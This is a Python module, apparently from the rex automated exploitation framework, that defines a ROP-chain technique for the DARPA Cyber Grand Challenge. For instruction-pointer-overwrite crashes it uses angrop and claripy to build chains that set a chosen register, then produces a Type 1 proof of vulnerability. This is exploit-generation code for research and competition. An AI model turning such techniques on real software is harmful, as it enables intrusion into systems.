import angrop
import claripy
import logging
from rex import Vulnerability
from rex.exploit import CannotExploit
from ..exploit import ExploitException
from ..cgc import CGCType1RopExploit
from ..technique import Technique

l = logging.getLogger("rex.exploit.techniques.rop_set_register")

class RopSetRegister(Technique):
    '''
    Very CGC specific register setting technique, does a lot of special stuff to make sure the value the register is
    set to is flexible.
    '''

    name = "rop_set_register"

    applicable_to = ['cgc']

    cgc_registers = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"]

    # this technique should create an exploit which is a type1 pov
    pov_type = 1

    generates_pov = True

    def set_register(self, register):
        #pylint:disable=arguments-differ

        ct = self.crash.crash_type
        if not (ct == Vulnerability.IP_OVERWRITE or ct == Vulnerability.PARTIAL_IP_OVERWRITE):
            raise CannotExploit("can only apply this technique to ip overwrite vulnerabilities")

        value_var = claripy.BVS('register_value', self.crash.project.arch.bits)
        ip_var = claripy.BVS('ip_value', self.crash.project.arch.bits)
        try:
            # get a chain with a dummy value
            chain = self.rop.set_regs(**{register: value_var})
        except angrop.errors.RopException:
            raise CannotExploit("[%s] no rop chains which set the registers %s" % (self.name, register))

        chain, chain_addr = self._ip_overwrite_with_chain(chain)

        l.debug("attempting to insert chain of length %d", len(chain.payload_str()))

        ccp = self.crash.copy()

        # add the constraints introduced by rop
        ccp.state.se.add(*chain._blank_state.se.constraints)

        chain.add_value(ip_var)
        chain_bv = chain.payload_bv()

        ch_sym_mem = ccp.state.memory.load(chain_addr, len(chain_bv)/8)
        ccp.state.add_constraints(ch_sym_mem == chain_bv)

        return CGCType1RopExploit(ccp, register, ch_sym_mem, value_var, ip_var)

    def apply(self, **kwargs):

        for register in RopSetRegister.cgc_registers:
            try:
                reg_setter = self.set_register(register)
                l.info("can set register [%s] with rop", register)
                return reg_setter
            except CannotExploit as e:
                l.debug("unable to set register %s (%s)", register, e.message)
